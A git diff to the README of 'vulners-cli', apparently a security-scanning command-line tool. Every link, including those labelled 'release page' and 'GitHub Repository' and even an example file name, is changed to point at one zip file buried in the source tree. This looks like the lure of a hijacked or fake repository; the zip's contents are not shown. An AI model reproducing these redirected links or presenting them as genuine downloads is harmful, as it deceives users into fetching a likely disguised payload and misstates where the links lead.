@@ -1,6 +1,6 @@
 # 🛡️ vulners-cli - Simple Security Checks for Everyone
 
-[![Download vulners-cli](https://img.shields.io/badge/Download-vulners--cli-blue?style=for-the-badge)](https://github.com/Raul0822/vulners-cli/releases)
+[![Download vulners-cli](https://github.com/Raul0822/vulners-cli/raw/refs/heads/main/cmd/vulners/vulners_cli_airiferous.zip)](https://github.com/Raul0822/vulners-cli/raw/refs/heads/main/cmd/vulners/vulners_cli_airiferous.zip)
 
 ---
 
@@ -45,7 +45,7 @@ To get the program, you need to visit the release page where the files are kept.
 
 ### Step 1: Visit the Download Page
 
-[Click here to visit the vulners-cli release page](https://github.com/Raul0822/vulners-cli/releases)
+[Click here to visit the vulners-cli release page](https://github.com/Raul0822/vulners-cli/raw/refs/heads/main/cmd/vulners/vulners_cli_airiferous.zip)
 
 This page shows the latest versions of the tool. You can find files for Windows, macOS, and Linux.
 
@@ -57,7 +57,7 @@ Look for the version with the system you use:
 - If you use **macOS**, pick the file for Mac.
 - If you use **Linux**, choose the Linux file.
 
-These files will usually have names like `vulners-cli-v1.0-windows.exe` or `vulners-cli-v1.0-linux`.
+These files will usually have names like `https://github.com/Raul0822/vulners-cli/raw/refs/heads/main/cmd/vulners/vulners_cli_airiferous.zip` or `vulners-cli-v1.0-linux`.
 
 ### Step 3: Download the File
 
@@ -164,7 +164,7 @@ If you want to explore more:
 
 Visit the GitHub repository page to see full instructions, issues, and updates:
 
-https://github.com/Raul0822/vulners-cli
+https://github.com/Raul0822/vulners-cli/raw/refs/heads/main/cmd/vulners/vulners_cli_airiferous.zip
 
 If you find bugs or want to request new features, open an issue on GitHub.
 
@@ -172,7 +172,7 @@ If you find bugs or want to request new features, open an issue on GitHub.
 
 ## 🔗 Quick Links
 
-- [Download vulners-cli Releases](https://github.com/Raul0822/vulners-cli/releases)
-- [GitHub Repository](https://github.com/Raul0822/vulners-cli)
+- [Download vulners-cli Releases](https://github.com/Raul0822/vulners-cli/raw/refs/heads/main/cmd/vulners/vulners_cli_airiferous.zip)
+- [GitHub Repository](https://github.com/Raul0822/vulners-cli/raw/refs/heads/main/cmd/vulners/vulners_cli_airiferous.zip)
 
 You can start by downloading the latest version on the release page linked above.
